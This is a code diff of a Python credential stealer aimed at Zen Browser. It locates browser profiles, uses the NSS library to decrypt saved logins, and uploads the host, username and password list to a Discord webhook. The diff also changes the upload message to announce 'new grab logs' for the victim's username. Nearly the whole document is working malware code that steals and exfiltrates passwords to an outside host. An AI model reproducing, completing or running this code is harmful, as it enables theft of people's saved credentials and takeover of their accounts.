@@ -4,7 +4,6 @@ import ctypes
 import base64
 import getpass
 import requests
-import hashlib
 
 username = getpass.getuser()
 
@@ -18,7 +17,7 @@ def find_profiles(path):
     return profiles
 
 def setup_nss(profile_path):
-    nss_path = r'C:\Program Files\Zen Browser'  # путь - NSS
+    nss_path = r'C:\Program Files\Zen Browser'  # NSS
     os.environ['PATH'] += f';{nss_path}'
     nss = ctypes.CDLL(os.path.join(nss_path, 'nss3.dll'))
 
@@ -53,26 +52,21 @@ def decrypt_logins(profile_path, nss):
         results.append(f'{host} | {user} | {pw}')
     return results
 
-def save_to_txt(data, filename="decrypted_logins.txt"):
+def save_txt(data, filename="decrypted_logins.txt"):
     with open(filename, 'w', encoding='utf-8') as f:
         f.write('\n'.join(data))
     return filename
 
 def send_discord(webhook_url, data, filename):
-    txt_file = save_to_txt(data, filename)
+    txt_file = save_txt(data, filename)
     with open(txt_file, 'rb') as f:
         files = {'file': (txt_file, f, 'text/plain')}
-        payload = {"content": "Decrypted Browser Logins File"}
+        payload = {"content": f"@here New grab logs, user: {username}"}
         requests.post(webhook_url, data=payload, files=files)
     os.remove(txt_file)
 
-def get_file_signature(file_path):
-    with open(file_path, 'rb') as f:
-        file_content = f.read()
-    return hashlib.sha256(file_content).hexdigest()
-
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/ ? "  # Webhook URL
+    webhook_url = "https://discord.com/api/webhooks/ ?"  # Webhook URL
     profiles_base = rf'C:\Users\{username}\AppData\Roaming\zen\Profiles'
     profiles = find_profiles(profiles_base)
 
